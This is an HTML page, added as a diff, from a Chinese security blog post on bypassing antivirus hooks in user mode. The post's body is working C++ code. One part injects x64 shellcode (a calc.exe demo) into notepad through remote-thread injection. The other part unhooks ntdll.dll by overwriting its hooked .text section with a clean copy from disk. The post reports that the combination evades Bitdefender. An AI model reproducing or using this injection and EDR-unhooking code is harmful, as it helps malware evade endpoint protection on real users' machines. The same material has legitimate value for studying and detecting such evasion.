@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x1、前言ntdll.dll常常是被AV&#x2F;EDR hook的主要模块，当程序完全加载完毕后，我们可以尝试从system32目录下加载一个干净的ntdll.dll。  将 ntdll.dll 的新副本从磁盘映射到进程内存 查找挂钩的 ntdll.dll 的 .text 部分的虚拟地址 获取 ntdll.dll 基地址 模块基址 + 模块的 .text 部分 VirtualAddress">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从ring3绕过AV hook">
+<meta property="og:url" content="http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/index.html">
+<meta property="og:site_name" content="Dp0rt Blog">
+<meta property="og:description" content="0x1、前言ntdll.dll常常是被AV&#x2F;EDR hook的主要模块，当程序完全加载完毕后，我们可以尝试从system32目录下加载一个干净的ntdll.dll。  将 ntdll.dll 的新副本从磁盘映射到进程内存 查找挂钩的 ntdll.dll 的 .text 部分的虚拟地址 获取 ntdll.dll 基地址 模块基址 + 模块的 .text 部分 VirtualAddress">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121705011.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121706233.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121741494.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121741109.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121754781.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121931281.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121929662.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121959377.png">
+<meta property="article:published_time" content="2023-07-12T08:52:36.000Z">
+<meta property="article:modified_time" content="2023-07-12T12:17:05.977Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121705011.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>从ring3绕过AV hook</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">主页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于我</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/07/11/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&text=从ring3绕过AV hook"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&title=从ring3绕过AV hook"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&is_video=false&description=从ring3绕过AV hook"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=从ring3绕过AV hook&body=Check out this article: http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&title=从ring3绕过AV hook"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&title=从ring3绕过AV hook"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&title=从ring3绕过AV hook"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&title=从ring3绕过AV hook"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&name=从ring3绕过AV hook&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&t=从ring3绕过AV hook"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x1%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x1、前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x2%E3%80%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x2、分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x3%E3%80%81%E5%AE%9E%E9%AA%8C"><span class="toc-number">3.</span> <span class="toc-text">0x3、实验</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        从ring3绕过AV hook
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-12T08:52:36.000Z" class="dt-published" itemprop="datePublished">2023-07-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h4 id="0x1、前言"><a href="#0x1、前言" class="headerlink" title="0x1、前言"></a>0x1、前言</h4><p><strong>ntdll.dll常常是被AV&#x2F;EDR hook的主要模块，当程序完全加载完毕后，我们可以尝试从system32目录下加载一个干净的ntdll.dll。</strong></p>
+<ol>
+<li>将 ntdll.dll 的新副本从磁盘映射到进程内存</li>
+<li>查找挂钩的 ntdll.dll 的 .text 部分的虚拟地址</li>
+<li>获取 ntdll.dll 基地址</li>
+<li>模块基址 + 模块的 .text 部分 VirtualAddress</li>
+<li>查找新映射的 ntdll.dll 的 .text 部分的虚拟地址</li>
+<li>获取挂钩模块的 .text 部分的原始内存保护</li>
+<li>将 .text 部分从新映射的 dll 复制到原始（挂钩的）ntdll.dll 的虚拟地址（在第 3 步中找到）——这是取消挂钩的主要部分，因为所有挂钩的字节都被磁盘中的新字节覆盖</li>
+<li>将原始内存保护应用到原始 ntdll.dll 的刚脱钩的 .text 部分</li>
+</ol>
+<h4 id="0x2、分析"><a href="#0x2、分析" class="headerlink" title="0x2、分析"></a>0x2、分析</h4><p>这里使用常规进程注入代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">FindPid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE         hProcessSnap = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL           bRet = FALSE;</span><br><span class="line">    PROCESSENTRY32 pe32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD dwProcessId;</span><br><span class="line">    hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line">    pe32.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        bRet = <span class="built_in">Process32First</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">        <span class="keyword">while</span> (bRet) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!_wcsicmp(pe32.szExeFile, <span class="string">L&quot;notepad.exe&quot;</span>)) &#123;</span><br><span class="line">                dwProcessId = pe32.th32ProcessID;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            bRet = <span class="built_in">Process32Next</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwProcessId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">INject</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">    HANDLE processHandle;</span><br><span class="line">    HANDLE remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line">    <span class="comment">//x64 calc shellcode</span></span><br><span class="line">    UCHAR buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    processHandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(processHandle, remoteBuffer, buf, <span class="keyword">sizeof</span> buf, <span class="literal">NULL</span>);</span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (remoteThread) &#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(remoteThread, <span class="number">500</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(remoteThread);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(processHandle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD pid = <span class="built_in">FindPid</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Find notepad pid : %d\n&quot;</span>, pid);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">INject</span>(pid);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在无AV环境下正常程序执行DLL加载过程</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121705011.png" alt="image-20230712170555905"></p>
+<p>这时候查看ntdll.dll中的函数是干净的</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121706233.png" alt="image-20230712170633172"></p>
+<p>我们在AV环境下调试程序的时候，杀软会自动加载dll</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121741494.png" alt="image-20230712174120435"></p>
+<p>查看ntdll中的函数，这时候ntdll.dll已经被bitdefender给hook了</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121741109.png" alt="image-20230712174150045"></p>
+<p>由于ntdll.dll在ring3层被hook了，我们如果想要绕过他的hook，就只用重新将一个干净的ntdll.dll加载一次，来绕过ring3的hook，下列是unhook代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">UNHOOKntdll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MODULEINFO Nt = &#123;&#125;;</span><br><span class="line">    HMODULE ntdllModule = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetModuleInformation</span>(<span class="built_in">HANDLE</span>(<span class="number">-1</span>), ntdllModule, &amp;Nt, <span class="built_in">sizeof</span>(Nt));</span><br><span class="line">    LPVOID ntdllBase = (LPVOID)Nt.lpBaseOfDll;</span><br><span class="line">    HANDLE ntdllFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;c:\\windows\\system32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE ntdllMapping = <span class="built_in">CreateFileMapping</span>(ntdllFile, <span class="literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    LPVOID ntdllMappingAddress = <span class="built_in">MapViewOfFile</span>(ntdllMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;</span><br><span class="line">    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; hookedNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)<span class="built_in">IMAGE_FIRST_SECTION</span>(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">char</span>*)hookedSectionHeader-&gt;Name, (<span class="type">char</span>*)<span class="string">&quot;.text&quot;</span>)) &#123;</span><br><span class="line">            DWORD oldProtection = <span class="number">0</span>;</span><br><span class="line">            <span class="type">bool</span> isProtected = <span class="built_in">VirtualProtect</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);</span><br><span class="line">            <span class="built_in">memcpy</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">            isProtected = <span class="built_in">VirtualProtect</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, oldProtection, &amp;oldProtection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(ntdllFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(ntdllMapping);</span><br><span class="line">    <span class="built_in">FreeLibrary</span>(ntdllModule);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x3、实验"><a href="#0x3、实验" class="headerlink" title="0x3、实验"></a>0x3、实验</h4><p>使用普通注入情况下，直接检测到注入，立刻就被干掉了。</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121754781.png" alt="image-20230712175437731"></p>
+<p>使用reload ntdll.dll，直接将hook移除</p>
+<p>移除前ntdll.dll还是被AV hook中</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121931281.png" alt="image-20230712193135222"></p>
+<p>移除后hook后在检查时发现ntdll.dll已经干净了<img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121929662.png" alt="image-20230712192927602"></p>
+<p>绕过bitdefender注入到notepad中执行shellcode</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121959377.png" alt="image-20230712195927319"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">主页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/about/">关于我</a></li>
+        
+          <li><a href="/friends/">友链</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x1%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x1、前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x2%E3%80%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x2、分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x3%E3%80%81%E5%AE%9E%E9%AA%8C"><span class="toc-number">3.</span> <span class="toc-text">0x3、实验</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&text=从ring3绕过AV hook"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&title=从ring3绕过AV hook"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&is_video=false&description=从ring3绕过AV hook"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=从ring3绕过AV hook&body=Check out this article: http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&title=从ring3绕过AV hook"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&title=从ring3绕过AV hook"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&title=从ring3绕过AV hook"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&title=从ring3绕过AV hook"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&name=从ring3绕过AV hook&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/&t=从ring3绕过AV hook"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2023
